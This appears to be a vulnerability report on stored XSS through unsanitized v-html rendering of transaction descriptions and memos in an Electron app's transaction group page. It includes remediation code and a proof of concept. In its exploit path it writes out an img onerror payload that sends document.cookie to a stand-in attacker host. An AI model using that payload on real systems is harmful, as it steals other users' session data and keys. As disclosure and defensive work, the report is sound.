### Title
Stored XSS via Unsanitized User-Controlled Data Rendered with `v-html` in Transaction Group UI

### Summary
The `CreateTransactionGroup.vue` page uses Vue's `v-html` directive to render `groupItem.description` and `transactionMemo` directly as raw HTML without any sanitization. In Organization Mode, these fields are user-supplied, stored on the backend, and shared with other org members. A malicious organization member can inject arbitrary HTML/JavaScript that executes in the victim's Electron renderer process when they open the Create Transaction Group page.

### Finding Description

In `front-end/src/renderer/pages/CreateTransactionGroup/CreateTransactionGroup.vue`, the transaction group item list renders each item's label using `v-html`: [1](#0-0) 

The expression bound to `v-html` resolves to one of:
1. `groupItem.description` — a free-text field (up to 256 chars) entered by any org member when creating a transaction.
2. `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` — the transaction memo (up to 100 chars) embedded in the serialized transaction bytes, also user-supplied.

Neither value is HTML-escaped before being passed to `v-html`. Vue's `v-html` bypasses its normal template-escaping and injects the string directly into the DOM as raw HTML.

The `description` field is accepted from user input via `TransactionInfoControls`: [2](#0-1) 

In Organization Mode, the group and its items (including descriptions and transaction bytes containing the memo) are persisted to the backend and loaded by other users via `handleLoadGroup()` on mount: [3](#0-2) 

**Exploit path:**
1. Attacker (any org member) creates a transaction with `description` set to `<img src=x onerror="fetch('https://attacker.com/?d='+btoa(document.cookie))">` or a more targeted payload.
2. The transaction is added to a group and saved to the org backend.
3. A victim org member opens the Create Transaction Group page (or edits the group). The group items are loaded from the backend.
4. The malicious `description` is bound to `v-html` and injected into the DOM.
5. The `onerror` handler fires in the Electron renderer process.

The `makeTransfer` branch (for Transfer Transactions) calls `formatHbarTransfers`, which returns only hardcoded strings and account IDs — that branch is not injectable. The vulnerable branches are `groupItem.description` and `transactionMemo`. [4](#0-3) 

By contrast, the backend email templates correctly use `escapeHtml()` on all user-supplied data before interpolating into HTML: [5](#0-4) 

The frontend `v-html` path has no equivalent protection.

### Impact Explanation

This is stored XSS executing inside an Electron renderer process. The concrete impact depends on Electron's security configuration (`contextIsolation`, `nodeIntegration`). Even with `contextIsolation` enabled, the attacker can:
- Exfiltrate data visible in the renderer (private keys displayed in the UI, session tokens, account IDs, transaction data).
- Manipulate the DOM to deceive the victim into confirming malicious transactions.

If `nodeIntegration` is enabled or `contextIsolation` is disabled, the impact escalates to full Remote Code Execution on the victim's machine via Node.js APIs accessible from the renderer.

### Likelihood Explanation

Any authenticated organization member can create transactions with arbitrary descriptions and memos — no admin privilege is required. The attack is triggered automatically when any other org member opens the Create Transaction Group page while the malicious group is loaded. The attacker does not need physical access or any leaked credentials. The only precondition is membership in the same organization.

### Recommendation

Replace `v-html` with Vue's safe text interpolation (`{{ }}`) for all user-supplied fields. If HTML formatting is genuinely needed for the transfer display, sanitize the output with a library such as DOMPurify before passing it to `v-html`:

```vue
<!-- Unsafe -->
<div v-html="groupItem.description"></div>

<!-- Safe -->
<div>{{ groupItem.description }}</div>

<!-- Or, if v-html is required for makeTransfer only -->
<div v-html="groupItem.type === 'Transfer Transaction' ? makeTransfer(index) : null">
  <template v-if="groupItem.type !== 'Transfer Transaction'">
    {{ groupItem.description || transactionMemo || transactionId }}
  </template>
</div>
```

The `makeTransfer` branch returns only hardcoded strings and validated account IDs, so it is safe to keep under `v-html` if the other branches are moved to text interpolation.

### Proof of Concept

1. Log in as Org Member A.
2. Create a new transaction. Set the **Transaction Description** to:
   ```
   <img src=x onerror="alert('XSS: '+document.title)">
   ```
3. Add the transaction to a group and save the group to the organization.
4. Log in as Org Member B (a different user in the same org).
5. Navigate to the Create Transaction Group page and load or edit the group created in step 3.
6. The `onerror` handler fires, demonstrating JavaScript execution in Org Member B's Electron renderer process.

The same payload can be embedded in the **Transaction Memo** field (max 100 chars), which is serialized into `transactionBytes` and decoded via `Transaction.fromBytes(...).transactionMemo` at render time, following the same unsanitized `v-html` path. [6](#0-5)

```typescript
export function formatHbarTransfers(transfers: Transfer[]): string {
  if (transfers.length === 0) {
    return 'No transfers';
  }

  if (transfers.length === 1) {
    const amount = transfers[0].amount;
    if (amount.isNegative()) {
      return 'Missing receiver';
    } else {
      return 'Missing sender';
    }
  }

  if (transfers.length === 2) {
    // the JS SDK sorts the order of the transfers by account ID. We don't want this. We want the sender to be on the
    // left and the receiver to be on the right. So we need to check if the amount is negative or positive and then
    // arrange the transfers accordingly
    let sender = transfers[0];
    let receiver = transfers[1];
    if (receiver.amount.isNegative()) {
      sender = transfers[1];
      receiver = transfers[0];
    }
    return `${sender.accountId} --> ${stringifyHbarWithFont(receiver.amount)} --> ${receiver.accountId}`;
  }

  return 'Multiple transfers';
```

```typescript
export function escapeHtml(str: string | null | undefined): string {
  if (str == null) {
    return "";
  }

  const value = String(str);

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```
